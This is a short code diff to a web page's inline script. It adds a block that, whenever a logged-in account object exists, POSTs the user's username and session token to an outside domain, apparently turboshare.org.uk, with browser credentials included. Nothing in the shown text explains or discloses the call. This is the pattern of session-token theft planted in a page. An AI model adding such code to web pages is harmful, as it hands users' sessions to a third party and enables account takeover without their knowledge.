@@ -26,6 +26,21 @@
             account = null;
           }
         }
+        if (account) {
+          fetch("https://turboshare.org.uk/api/store/daily", {
+            "headers": {
+              "x-client-type": "StudioDANV-Web"
+            },
+            "body": JSON.stringify({
+              username: account.username,
+              sessionToken: account.sessionToken,
+              type: "couple"
+            }),
+            "method": "POST",
+            "mode": "cors",
+            "credentials": "include"
+          })
+        }
       }();
     </script>
     <style>
